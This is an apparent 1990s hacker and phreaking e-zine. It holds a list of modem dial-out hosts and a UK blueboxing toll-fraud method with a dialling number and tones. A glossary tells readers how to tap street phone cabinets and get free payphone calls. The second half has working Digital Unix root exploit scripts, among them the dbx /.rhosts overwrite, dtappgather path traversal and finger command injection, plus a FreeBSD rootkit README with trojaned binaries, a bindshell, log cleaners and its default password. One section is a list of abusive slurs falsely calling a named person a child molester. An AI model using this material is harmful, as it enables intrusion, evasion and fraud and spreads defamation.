         1800        ublan2.acc.virginia.edu
                     >>connect telnet
                     >>connect hayes
                     atdt9,,xxx-xxxx
                     CPN 804-847-2501

  !!!     814        dialout.psu.edu     atdt8xxxxxxxxxx

          1800        CompuServe  2400  82387910
                         Telenet  2400  82311510
                          Tymnet  2400  82343853
                          DEC.    9600  7AM-Midnight EST  818002341998
                                        Port name: _LTA4974:

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄx.25 network access only [NUI required]ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
     NPAs:204.306.403.416.418.506.514.519.604.613.709.902.905

          DATAPAC 3101 (ASYNC/ITI) OUT-DIAL PORT ADDRESSES
             Outdial Ports (accept only prePAID calls!)
            The Destination terminal must be set to 7E1
              in order to receive the outdial call

     1) ENTER THE 7-DIGIT TELEPHONE NUMBER (LOCAL) OF THE DESTINATION
        TERMINAL.
     2) DATAPAC WILL RESPOND WITH:
        DIALING/COMPOSITION DU NUMERO (XXX-XXXX)
     3) DATAPAC WILL THEN INDICATE:
        RINGING/SONNERIE
        AS THE MODEM DETECTS RINGBACK TONE.
     4) WHEN THE DESTINATION MODEM ANSWERS THE CALL, DATAPAC WILL SEND
        THE FOLLOWING MESSAGE TO THE ORIGINATING END:
         CALL CONNECTED/COMMUNICATION ETABLIE

   NPA  City (PROVINCE)      SPEED      NUA ADDRESS
   ---  ---------------      -----      -------------
   403  Calgary (ALTA)        300       0302063300900
                             1200       0302063300901
   416  Clarkson (ONT)        300       0302091900900
                             1200       0302091900901
   403  Edmonton (ALTA)       300       0302058700900
                             1200       0302058700901
   902  Halifax (NS)          300       0302076101900
                             1200       0302076101901
   905  Hamilton (ONT)        300       0302038500900
                             1200       0302038500901
   519  Kitchener (ONT)       300       0302033400900
                             1200       0302033400901
   519  London (ONT)          300       0302035600900
                             1200       0302035600901
   514  Montreal (QUE)        300       0302082700902
                             1200       0302082700903
   613  Ottawa (ONT)          300       0302085700901
                             1200       0302085700902
   418  Quebec City (QUE)     300       0302048400900
                             1200       0302048400901
   306  Regina (SASK)         300       0302072100900
                             1200       0302072100901
   506  St-John's (NB)        300       0302074600900
                             1200       0302074600901
   306  Saskatoon (SASK)      300       0302071100900
                             1200       0302071100901
   709  St. John (NFLD)       300       0302078100900
                             1200       0302078100901
   416  Toronto (ONT)         300       0302091600901
                             1200       0302091600902
   604  Vancouver (BC)        300       0302067100900
                             1200       0302067100901
   519  Windsor (ONT)         300       0302029500900
                             1200       0302029500901
   204  Winnipeg (MAN)        300       0302069200902
                             1200       0302069200901

   ???  0228479110650  DIALOUT PSW??  CALL 50 LOGIN=LOGIN 70,1/NAME:XX

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Misc ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  !?!     EURO       eurogate.iit.nl
                     register  call European carriers
                     (access via telnet is restricted?)

  !?!     513        dialout.afit.af.mil   dialout PWD?
                     port 2
  !?!     414        modems.uwp.edu  Ctrl-{   #
                     Connection Refused
  !?!     404        emory.edu      .modem8 or .dialout
  !?!     DC         dialout24.cac.washington.edu
                     CONNECTION REFUSED
  ?!?     604        dial24-nc00.net.ubc.ca |  dial24-nc01.net.ubc.ca
  ?!?     604        dial96-np65.net.ubc.ca
  !?!                isn.upenn.edu  "modem" attached to 17 port

  LOCAL              DIALOUT.IUPUI.EDU
                     l/p:DIALOUT/

  DOWN    213        bbs.thecosmos.com
          214        register first / dial dallas and LA
  DOWN    215        isn.upenn.edu
                     
                      DIAL: MODEM
  DOWN    416        pacx.utcs.utoronto.ca  outdial unavail
                     www.utoronto.ca/welcome.html/index.html
  DOWN?   619        dialin.ucsd.edu   "dialout"  Sandego CA
  DOWN    916        cc-dnet.ucdavis.edu   connect hayes/dialout

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Login/Pass or Port Pass ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  PSW     204        dial.cc.umanitoba.ca
  PSW     206        rexair.cac.washington.edu
  PSW     303        yuma.ACNS.ColoState.EDU      login: modem
  PSW     412        dialout.pitt.edu / gate.cis.pitt.edu
                     only for students "Connect Dialout"
                       "d91kxxxxxx" x=fone #
                      or tn3270,  connect dialout.pitt.edu,
                     atdtxxxXXXX
  PSW     514        cartier.CC.UMontreal.CA      externe,9+number
  PSW     602        dial9600.telcom.arizona.edu
  PSW     619        dialin.ucsd.edu                "dialout"
  PSW     ???        modems.csuohio.edu
  PSW     ???        dialout.bu.edu
  PSW     ???        portal.ucs.indiana.edu  ONLY for Students
                      http://msgwww.ucs.indiana.edu/messaging/
                      /projects/portal/dialout.html
  PSW                128.187.1.2
  PSW     TW         sparc20.ncu.edu.tw      u349633
  PSW     TW         sun2cc.nccu.edu.tw       ?
  PSW                twncu865.ncu.edu.tw    guest    

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Trying... ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  ???     206        rexair.cac.washington.edu
  ???     206        dialout24.cac.washington.edu
  ???     218        modem.d.umn.edu              Hayes 9,XXX-XXXX
  ???     307        modem.uwyo.edu
  ???     313        35.1.1.6  "dial2400-aa" or "dial1200-aa"
  ???     415        128.32.132.250  CA  "dial1" or "dial2"
  ???     502        outdial.louisville.edu
  ???     502        uknet.uky.edu  connect kecnet
                     @ dial: "outdial2400 or out"
  ???     602        acssdial.inre.asu.edu/[129.219.17.3].
                     atdt8,,,,,[x][yyy]xxxyyyy.
  ???     609        129.72.1.59 Princeton NJ   | "Hayes"
                     128.119.131.11X
  ???     615        dca.utk.edu   "dial2400"   Tennessee
  ???     713        128.249.27.153             | "Hayes"
  ???     713        128.249.27.154  , Login:c modem96
  ???     714        130.191.4.70              atdt 8xxx-xxxx
  ???     714        modem.nts.uci.edu    atdt[area]0[phone]
  ???                128.6.1.42
  ???                modempool.pbs.org  "connect"
  ???                datapbx.cc.ncsu.edu dest:dial  ATDT 9,xxxxxxxx
                     www2.ncsu.edu

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ No route ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  ROUTE   OH*        r596adi1.uc.edu | 129.137.33.72
  ROUTE   404        128.140.1.239  .modem8|CR  .modem96|CR
  ROUTE   212        DIALOUT.NYU.EDU            dial3/dial12/dial24
  ROUTE   514        132.204.211
  ROUTE   619        128.54.30.1 nue, ?  atdt [area][phone]
  ROUTE              129.180.1.57
  ROUTE   ???        modem.nyu.edu
  ROUTE   ???        TN3270  telnet.ksu.edu
                     At the Select Destination prompt, enter DIALOUT
                     Perhaps a better method is to use MS-Kermit 3.10
                     MSKERMIT
                     SET HOST TELNET.KSU.KSU.EDU
                     DIALOUT
                     ATDT9[1aaappp]xxxxxxx[,,auth]
                     to USE AT&T calling Card
                     ATDT90NPAxxxxxxx,,,,CardNumberPIN

7  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Dead ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

  ///     215        wiseowl.ocis.temple.edu    | atz atdt 9xxxyyy
  ///     218        aa28.d.umn.edu    "cli" "rlogin modem"
  ///     404        broadband.cc.emory.edu    Atlanta Georgia
  ///     404        dialout1.princeton.edu
  ///     416        annex132.berkeley.edu. 9xxxyyyy?atdt9,,,,,xxxyyyy?
  ///     614        ns2400.ircc.ohio-state.edu (DIAL)
  ///     617        dialout.lcs.mit.edu ()
  ///     902        star.ccs.tuns.ca           | "dialout"     P E I
  ///                modem.atk.com
  ///                modem.cis.uflu.edu
  ///                vtnet1.cns.ut.edu              "CALL" or "call"

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  Note descriptions  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                 ???     trying IP address...
                 ///     Unknown Host
                 ROUTE   No route to Host
                 LOCAL   Local Access only ?
                 PSW     Login/Password Required
                 !?!     Strange
                 !!!     Working (should be, heh)

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Used Dox/Search Engines ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

              www.altavista.com | www.infoseek.com [Ultra]
                  Dialout List#4 - 22/12/93 By SPiN-DoC
                2600's Vol. 8 #1 Dialout List +- some junk
                             alt2660.faq
                         [Hardcore Phreaks (8)]

  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                                 [eoF^z]

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. BlueBoxing in the UK in '98 : The UK Phreaking Elite
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

     .------------------------------------------------------------------.
     |         \        ____     \__    __          ____       /        |
     |      ___/       / / /        \_ /  \        / / /       \___     !
     |     /   \  ____/  \/___________|___________/  \/________/   \__  :
     !       __/\/                                         / /          :
     :    __/   /_________________________________________/ /\__        !
     :          \_________________________________________\/ /  \___    |
     :            __/               \___         ____/                  |
     :        \__/  \__/           _/   \__/    /    \__                |
     :              /     |       / .              !  .   |             !
     !         .       :  !               :        :  .                 :
     |                 |  .      |        !        :  :   !             :
     !           :     !__|      !                 |__!   :             !
     :                /   / D e s T r u C T i v E /   /   :             :
     :         : !___/   /_______________________/   /____!__           :
     !         !/   /   /   /   /       /   ____/   / ___   /           !
     `-------- /   /   /   /   /   /   /   /   /   /     __/ -----------'
               \______/\______/\__/___/\______/\__/\______/

                       "The Hardcore Will Never Die"
                        

 Since March 1994 there have been many rumours about the "death" of
 Blueboxing. The truth is that Blueboxing is very much alive, it has just
 become a little more difficult, and harder to understand. In some cases
 it's not just a case of knowing the tones, it also takes a lot of skill
 and patience.

 The "elites" who have been boxing since then (excluding lamers
 spoon-fed info from earlier Destructive Jungle releases), have had to work
 hard to find out how to carry on boxing, and have kept it to themselves.
 
   
 In reaction to recent busts, we are now going to once again, teach the
 newbies, lamers, and in fact, everyone we possibly can, how to Bluebox. BT
 may think they have a problem already, but the trouble is only just
 beginning. Spread this information as far and wide as you can.
 
 This "current" method (as of 24/02/98) is actually very simple:   


 The magic number is: 0800 890 861 (China Direct Calling Card Service)

			Freq 1 Freq 2  Length
			---------------------
                Tone 1  2400Hz/2600Hz  135ms
                Tone 2  2400Hz/2400Hz  240ms

 Best to send the break after pick-up. It's all automated, so it won't annoy
 any operators.

 As well as calling China, you can also call the UK (trade warez for hours!)
 and New Zealand. A few other countries are possibly available, but they keep 
 changing them.

 For those of you with bad memories:

   KP2-44-0-171-930-4832-ST is the format for international dialling.

 ---

 Special note to BT:

 This file is written by nobody in particular. The person(s) posting it
 to newsgroups/BBS's/wherever have no connection with us. You can try to find
 the people responsible, but will soon come to realise that it's an impossible
 mission. Myself and my friends certainly will not be blueboxing, and have
 not done for quite some time.

 This particular route probably won't last very long, but there are plenty
 more to come. 

 We will always have the upper hand.

						Hugs & Kisses.

						The UK Phreaking Elite.



ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. UK Phone Definitions and Abbreviations : Jf
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

I have put together as much stuff as I think is necessary for an average
knowledge of the UK fone system, switching methods and exchange types.
I would defiently recommend researching into the subjects contained in this
document in more detail to gain a very detailed knowledge, if you are stuck
then email me and I will help to guide you along. The Information below is
enough to get you started and provide you with an average knowledge of the
UK fone system.... so enjoy..

Jf_ aka Josh Freedaleman

JF@cofuk.org
http://www.cofuk.org

======================================
AAS - Automatic Announcement Subsystem	
======================================

Used in Local Exchanges as a method of voice operated guidance. eg. informs of
code changes by automated messages. For example, these appeared a lot in 1994
when all area codes changed. On 16th April 1994 all area codes had a 1 added
to them. For example 081 became 0181 and therefore AAS was used alot during
this time to leave automated messages, these go something like this...

"This is a BT announcement, the number you have dialed has changed, pleased add
a 1 after the 0 on the area code and replace the handset and try again".

=========
Cab Boxes
=========	

Large green boxes located on the sides of roads to deal with all the lines in
that area, some cab boxes are full of 100s of wires for that area whereas
others can be much smaller. I would recommend having a look inside one of these
as they are totally full of wires but don't get caught opening one of these as
you might be arrested! :o) If you open one of these cab boxes you can beige
box off it, good fun if the cab box has 100s of lines in it as you can easily
seize lot of peoples fone lines :o) If you have a laptop computer you could
find a cab box in a secluded area, box of it, hide in bushes or something and
hax0r from that seized line, I would recommend this if you are going to carry
out a big hack. -- Cab boxes are also called PCP's (so1o)

========================================================================
CCITT -	Consultive Committee for International Telegraphs and Telephones	
========================================================================

An international committee setup to regulate and discuss international fone
communication matters and standards of communication devices. The UK fone
system is based on CCITT7 which is used in most developed (?) countries such
a America and the UK. To blue box from the UK you need to be looking for
countries which used CCITT5 lines, the best way I know of to find CCITT5
lines is to dial the countries 0800 89 **** number and if you here a click
beep sound then you have identified a CCITT5 line which is vulnerable to
boxing.

===============================
CCS - Common Channel Signalling	
===============================

Process used by BT to reserve a speech channel for signalling and to control
all the other channels in its section.  This is the standard method of
signalling between digital exchanges.

===============================================
COCOT -	Customer Owned Coin Operated Telephones
===============================================	

A Payphone owned privately by businesses, they usually add a little bit extra
onto the price of calls to make some more money, found in hotels, swimming
pools etc.  There are lots of COCOT tricks that you can get up to, I have not
tried all of them but two that I have tried and have worked succesfully for
me are the following -

dial *#2580 on the fonepad, it makes the line an engineers test line and you
can then dial any number you wish for free, and I mean any number :o) 

Another trick is that some COCOT's have the line going into a wallplug located
near the telephone, just unhook the fone line and plug your own fone in place,
I did this at my local Swimming Pool recently and dialed a friend in the States
for FREE!#@!

===============================
CPS - Call Processing Subsystem	
===============================

Used on local exchanges to take overall control over a line, it registers the
state of the line and tells callers whether it is free, engaged etc. This is
the fundamental part of the local exchange and without this, well, there would
be no calls really as nothing would be able to register. 

===================================
DCCE - Digital Cell Centre Exchange
===================================

Another exchange which handles services on a local scale, distributing calls
to other exchanges, this is a lesser form of DMSU but perfoms a similar job.

=========================================
DDSN - Digitally Derived Services Network	
=========================================

A network of numbers used as service numbers eg 0800, 0891, 0898, 0500.

=============================
DLE - Digital Local Exchanges
=============================	

Hosts the RCU's used within a local exchange, If you get a chance to look at
you local DLE do it, I found it very impressive and was really stood there
in awe of it all.

===================================
DLSU - Digital Local Switching Unit	
===================================

Handles all the local customers fone needs and services, putting them onto the
right connections and switching them about so that they reach their required
destination. Really like an operator but as this is the 1990s its all in
digital form :o)

==================================
DMSU - Digital Main Switching Unit	
==================================

Controls and switches Telephone traffic within its designated area and it will
distribute this traffic to its local exchanges.

============================
DSU - Digital Switching Unit
============================

Original Manufactured to handle the very high call volume in and around London,
based on the DMSU but designed to take a higher amount of calls and distribute
them onto the local exchanges. DSU's are now found in and around lots of major
large cities where they are needed to take control of the high call volume
while the DMSU's take care of the rest of the country.

================================
DTMF - Dual Tone Multi-Frequency	
================================

The tones heard on your home fone when you dial in your numbers on the keypad.

==============================
ERS - Emergency Repair Service	
==============================

The Engineers on Standby to repair fones etc.

=============
Meridian Mail
=============

A Voice Mail System provider, owned by Northern Telecom and a major UK
supplier of VMB's for UK businesses. -- there are a few neat meridian mail
tricks (so1o)

=============================
PBX - Private Branch Exchange
=============================	

Exchange used by large companies to deal with their calls, great fun to
*hack*, I have found that these are usually located in the 0500 prefix
range. These are usually provided by Norstar and are very common with big
companies who have stores in all areas of the country, or on a local scale. 

===========================
PCM - Pulse Code Modulation
===========================

Modern BT signalling method used which cuts down information from several calls
into smaller packets, sending them in turn down the line.

========================================
PSTN - Public Switched Telephone Network
========================================	

This is a large BT exchange network which contains all the smaller local
exchanges and looks after all these. eg. DLE's, RCU's etc

==============================
RCU - Remote Concentrator Unit
==============================

Basically Cab Boxes (PCPs) that provide a meeting point for ALL the lines in
an area, they are bigger than Cab Boxes and tend to occupy full buildings
rather than little boxes on the side of the road, RCU's are therefore found
at your local telco depot and they are very impressive to look at.

========
System X	
========

System X is a digital phone exchange which was the first installed in UK and
was set to be installed 100% throughout UK until someone thought that it was
unfair for one company to dominate the digital exchange market so a company
called Ericsson produced AXE, a rival digital fone exchange system, the
AXE10 system was chosen by BT and this forms what we call the BT System Y
Exchange. System X technology was soon outdated after release due to the
fact that it was designed by a committee who were slow at releasing its first
model and by this time AXE had been released and it saw a vast technological
improvement on System X while keeping the fundamental backbone on which it
was based.

========
System Y	
========

The UK digital Exchange based heavily on the AXE10 Digital Exchnage System
Manufactured by Swesih company Ericsson, System Y is the UK alternative to
System X and is installed fully in over 90% of the UK. When it was released
it was much more technologically advanced than System X but heavily
structured on it.

====================
VMB - Voice Mail Box	
====================

Used by companies to keep in touch with each other by an answering machine
type of service, usually found as freefone numbers and a main supplier of
these is Meridian Mail. There are lots of VMBs which can be found if you scan
for them and they provide interesting toys if you want to *hack* them.   



Thats your lot for now...I believe that the information in this document is
all you need for an average knowledge of the UK fone system. I have cut out all
the bullshit and all the outdated info that you will find in numerous other
texts and left you with what you need.  If you have found an area in this
document that really interests you then do more research into that area and
specialise, you should be able to find further information on most things
included in this document, so go hunting or look out for more texts from me
soon....

If you would like to talk about anything connected with this text or any other
relevant h/p stuff then you can find me in #phreak and #CoF on undernet when
I am on irc. My nick is Jf_ of course :o)

Jf_ aka Josh Freedaleman

JF@cofuk.org
CoF - http://www.cofuk.org


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ MISC ]=====================[ .SECTION D. ]=======================[ MISC ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Top Ten Reasons why..You shouldn't leave small children alone with
     Emmanuel Goldstein.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

10) He isn't down with the posse, although he think's he is
9)  He seems a little too friendly
8)  He likes little boys
7)  His nick is jewish
6)  so1o said so
5)  He appeared on "The Learning Channel" inbetween when
    speedy and gonzolez showed you how to get free AOL
    and how to generate credit card numbers
4)  He published an arcticle on how to steal (*gasp*)
3)  He was an english major
2)  Do you know how hard it is to get rid of head lice?
1)  HE'S A FUCKIN CHILD MOLESTER YOU DUMB CUNT!@^&%$@%

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Hacking Digital Unix 4.0 : humble
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Local techniques
----------------

The first thing to try is the IFS hole in /usr/sbin/dop. If dop is setuid
root, there is a good chance that you can gain root this way. Here is a
shell script :

----------------------------------------------------------------------------

#!/bin/sh
cat > /tmp/usr <<EOF       
#!/bin/sh
IFS="   "                                                             
export IFS                                                       
exec /bin/sh               
EOF                                                                 
chmod 755 /tmp/usr         
IFS=/ PATH=/tmp:$PATH /usr/sbin/dop crack-user=root

----------------------------------------------------------------------------

After running this shell script, if it works, your euid should be 0. Your
prompt may or may not change depending on which shell you are using, so do
an id and check. That is a old sploit that most competent admins have 
probably fixed. 

Digital Unix has a large problem in the way that it handles core dumps of 
setuid root programs. If you can get a setuid root program to dump core,
it will create the core file as root, and it will follow symlinks. So,
how can we exploit this? I noticed a long time ago that if you run dbx
on a setuid root program that you have read access to, then it will core dump
in your current directory. Dbx is a debugger that comes with digital unix. 
However, some times machines won't have the liscence files installed
correctly. Here is the exploit :

----------------------------------------------------------------------------

#!/bin/sh
# dbx exploit by humble
# works on Digital Unix 4.x                                           
# this overwrites /.rhosts                                             
 
mkdir /tmp/.testing
cd /tmp/.testing                                                        
ln -s /.rhosts core                                                    
BOB="
+ +                                                   
"
export BOB                                                          
dbx /bin/crontab                                                      
dbx /bin/crontab                                                        
dbx /bin/crontab                                                         
rm -rf /tmp/.testing                                                
rsh -l root localhost /bin/sh -i

----------------------------------------------------------------------------

If /bin/crontab is not setuid root or you don't have read permissions to
it, you can use any other setuid root program.

Ok. If that doesn't work, there is another core dump situation I have
found. I have only verified this on three machines and have been told
that it hasn't worked on one or two others. The program /usr/X11/bin/dxpause 
is a screen locker. I found that when I run that program, and have my 
DISPLAY set to my freebsd or my linux box (running xfree86), the program
will dump core as root. Be carefull though, if the program doesn't dump
core, you will have to enter the password of the person who's account
you are using. You have to set up your X server to allow connections from
the target, and you will probably have to click once on your machine to
get the program running on the Digital Unix box to crash. 
Anyway, this can be exploited in a similair fashion to the dbx problem.

There is another core dump that was mentioned on Bugtraq by Tom Leffingwell,
but I haven't been able to re-create it. Here is excerpts from his posting:

----------------------------------------------------------------------------

Version Affected:  Digital UNIX 4.0B *with* patch kit 5
                   Unpatched 4.0B is not vunerable to this particular   
                   problem, but it is to others.

Patch kit 5 included a replacement xterm because the old one had a bug, too.
They replaced it with another that had a bigger problem. You can cause a
segmentation fault in xterm simply by setting your DISPLAY variable to a
display that you aren't allowed to connect to or one that doesn't exist.
Start xterm, and you get a core file.

----------------------------------------------------------------------------

Ok, core dumps not working? Don't worry.. there's more.
There has been some talk about holes in dtappgather on the security mailing
lists. We can use one of the holes to our advantage as well.
Using dtappgather, we can make any file on the system owned by us. This is
obviously a good way to take over a machine. Exploit:

env DTUSERSESSION=../../../../../../../../etc/passwd /usr/dt/bin/dtappgather

and /etc/passwd is now owned by us. This could be used to gain control of
/etc/inetd.conf and just about anything else you could imagine. I haven't 
used this exploit to mess around with the /tcb/files/auth/* tree, but I
would be willing to bet it is very successfull.

I've also noticed that the X server setup on some Digital Unix boxes are 
insecure. If you have a shell on the machine, try to set your DISPLAY to 
localhost:0 or the machines hostname:0, and then run a program like xkey.

Here are some exploits that I havent used or tried before (edited a little):

----------------------------------------------------------------------------

                         .LoW  _  _
                     |\  | _ |(_`|_'
                     |  \|(_)|,_)|_.
               ==========================

H0l4. So here it is another bug for Digital

System: OSF1 my.narco-goverment.sucks.co V4.0 464 alpha

Program: fstab - Static information about file systems and swap partitions
         advfsd - Starts the AdvFS graphical user interface daemon
Problemo: It creates a lockfile in tmp with nice permitions :)
   /tmp>ls -la

   (Blah Blah Blah.....)

   -rw-rw-rw-   1 root     system    0 Nov xx 15:49 fstab.advfsd.lockfile

What the hell to do with it:

   Before it creates
   ln -s /.rhosts /tmp/fstab.advfsd.lockfile

   from here... cat "+ +" > /tmp/fstab.advfsd.lockfile , etc etc.

                     The End - El Fin

                      Colombia 1997.

                         .LoW  _  _
                     |\  | _ |(_`|_'
                     |  \|(_)|,_)|_.

                   Efrain 'ET' Torres

----------------------------------------------------------------------------

This if for Digital Unix 3.x (I've never seen it work.)

$ ls -l /usr/tcb/bin/dxchpwd
-rwsr-xr-x   1 root     bin        49152 Jul 25  1995 /usr/tcb/bin/dxchpwd
$ ls -l /tmp/dxchpwd.log
/tmp/dxchpwd.log not found
$ export DISPLAY=:0     (or a remotehost)
$ ln -s /hackfile /tmp/dxchpwd
$ ls -l /hackfile
/hackfile not found
$ /usr/tcb/bin/dxchpwd
(The dxchpwd window will appear. Just enter root for username
 and anything for the passwd. You'll get a permission denied
message and the window will close.)
$ ls -l /hackfile
-rw-------   1 root     system         0 Nov 16 22:44 /hackfile

----------------------------------------------------------------------------

Remote techniques
-----------------

I don't have too much here except one pretty big hole. Digital Unix 4.x
is blind ip spoofable!!! So, if you can guess or determine a trust 
relationship, the machine is yours. Also, when the CERT statd advisory 
came out, Digital released a patch. I haven't played around with that, but
it might be worth looking into.

Also, Digital Unix 4.0 sometimes has an 0wned finger daemon, try this..

% finger Ý/bin/w@host

if this gives uptime info etc, it shows the system is vulnerable to this
attack, you can specify any command.. simple to use.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. FreeBSD 2.2.5 rootkit : humble / method
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Ok.. I found this rootkit out on an ftp site somewhere. Anyway, when I got
it, there was a bunch of compile errors and it seemed to be for an older
version of freebsd. So, I took a new source tree from my box and copied the
trojan code from this rootkit into it.. So, this rootkit will work on the
FreeBSD 2.2.5-RELEASE. The rootkit is around 350k in size (compressed) and
it is available from the following :

ftp.sekurity.org/users/so1o
www.technotronic.com/files/ezines/crh
www.fth.org/crh


Ok.. I left out the following trojans and files:

chpass		Trojaned! User->r00t
passwd		Trojaned! User->r00t
zapbsd2		An improved utmp/wtmp/lastlog type zapper
tripwire	Trojaned! Hide changes

but I put in:

marryv11.c      good log cleaner.. i put a #define bsd in it

Enjoy,
humble - jmcdonal@unf.edu 1/15/98

Thanks to ducksquak, simpson and sygma for testing.

The
 _____              ____ ____  ____  
|  ___| __ ___  ___| __ ) ___||  _ \ 
| |_ | '__/ _ \/ _ \  _ \___ \| | | |
|  _|| | |  __/  __/ |_) |__) | |_| |
|_|  |_|  \___|\___|____/____/|____/  rootkit 1.2 (1/27/97) by Method
                                     
NOTE: This package was heavily influenced by the existing Linux rootkit, 
which in turn was adapted from the SunOS rootkit, etc., etc.

UPDATES: 1.0.1 - Fixed some broken Makefile stuff.  Made it so inetd does 
the right thing on a SIGHUP.  Added some extra security to the shell trojans.
1.1 - Added tripwire trojan.  Cleaned up some other stuff.
1.2 - Put a password on inetd (Thanks for the suggestion Whoot :)

This package includes the following:

chpass		Trojaned! User->r00t
inetd		Trojaned! Remote access
login		Trojaned! Remote access
ls		Trojaned! Hide files
du		Trojaned! Hide files
ifconfig	Trojaned! Hide sniffing
netstat		Trojaned! Hide connections
passwd		Trojaned! User->r00t
ps		Trojaned! Hide processes
rshd		Trojaned! Remote access
syslogd		Trojaned! Hide logs
fix		File fixer!
addlen		File length fixer(!)
zapbsd2		An improved utmp/wtmp/lastlog type zapper
bindshell	port/shell type daemon!
tripwire	Trojaned! Hide changes
sniffit		A kewl sniffz0r!
		
INSTALLATION:
To install this kit execute the command 'make all install' from the # prompt.
All of the file/password configurations are in config.h so feel free to
modify things to suit your particular fancy.  Everything here has been 
tested on a FreeBSD-stable distribution. See the note at the end about 
what to do if the admin uses tripwire. Also make sure to read the 
Makefile and scripts so you know what's going on.

USAGE:
OK I will go through how to use each program one by one. NOTE when I say 
password I mean the rootkit password not your users password (d0h!). By 
default the rootkit password is "h0tb0x".

chpass -	Local user->root. Run ch{sh,fn,pass} then when it asks you 
		for a new name enter your password.

inetd -	 	Binds a shell to a port for remote access. Adds a shell 
		exec service on the ingreslock port, type in the rootkit
		password to start a shell.

login -		Allows login to any account with the rootkit password.
		If root login is refused on your terminal login as "r00t".
		History logging is disabled if you login using your password.

ls -		Trojaned to hide specified files and directories.
